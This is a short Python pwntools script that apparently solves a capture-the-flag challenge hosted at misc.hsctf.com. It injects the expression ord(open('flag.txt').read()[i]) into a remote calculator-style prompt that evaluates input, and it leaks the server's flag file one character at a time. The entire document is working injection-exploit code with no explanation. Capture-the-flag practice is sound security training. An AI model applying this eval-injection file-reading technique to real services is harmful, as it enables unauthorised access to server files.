#!/usr/bin/python
from pwn import *

flag = ''
i = 0
win = False

while not win:
    payload = 'ord(open("flag.txt").read()[' + str(i) + '])'
    conn = remote('misc.hsctf.com', 7001)
    conn.recvuntil(':')
    conn.send(payload + '\n')
    conn.recvuntil(':')
    conn.send("0\n")
    conn.recvuntil(':')
    conn.send("+\n")
    conn.recvuntil('supported\n')
    character = chr(int(conn.recvline().decode()))
    conn.close()
    flag += character
    if character == '}':
        win = True
    else:
        i += 1

f = open("flag.txt", "w")
f.write(flag)
f.close()

